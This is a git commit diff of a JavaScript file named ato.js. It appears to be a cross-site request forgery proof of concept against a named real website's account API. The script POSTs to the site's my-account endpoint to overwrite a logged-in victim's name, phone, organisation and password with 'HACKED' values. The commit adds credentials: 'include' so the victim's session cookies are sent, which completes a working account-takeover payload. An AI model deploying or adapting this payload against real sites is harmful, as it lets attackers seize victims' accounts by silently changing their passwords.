8c5fd3e7aafe92d7dc0cf42bb23d87b01c8fe553
memoooz <149635547+memoooz@users.noreply.github.com>
2024-12-01 05:05:51 +0200

    Update ato.js

--- ato.js
+++ ato.js
@@ -1,10 +1,11 @@
 fetch('https://www.fdiintelligence.com/api/fdi/my-account', {
     method: 'POST',
     headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
+        'Content-Type': 'application/x-www-form-urlencoded',
     },
-    body: 'firstName=HACKED&lastName=HACKED&password=IgotHacked0$&confirmPassword=IgotHacked0$&country=AL&iso2CountryDialCode=af&dialCode=%2B93&phone=HACKED&jobTitle=HACKED&organisationName=HACKED&organisationType=Government+agency%2Fdepartment&organisationTypeOther='
+    body: 'firstName=HACKED&lastName=HACKED&password=IgotHacked0$&confirmPassword=IgotHacked0$&country=AL&iso2CountryDialCode=af&dialCode=%2B93&phone=HACKED&jobTitle=HACKED&organisationName=HACKED&organisationType=Government+agency%2Fdepartment&organisationTypeOther=',
+    credentials: 'include'  // Ensure that cookies are sent with the request
 })
 .then(response => response.text())
-.then(data => console.log('Response:', data))
+.then(data => console.log('Request Sent:', data))
 .catch(error => console.error('Error:', error));
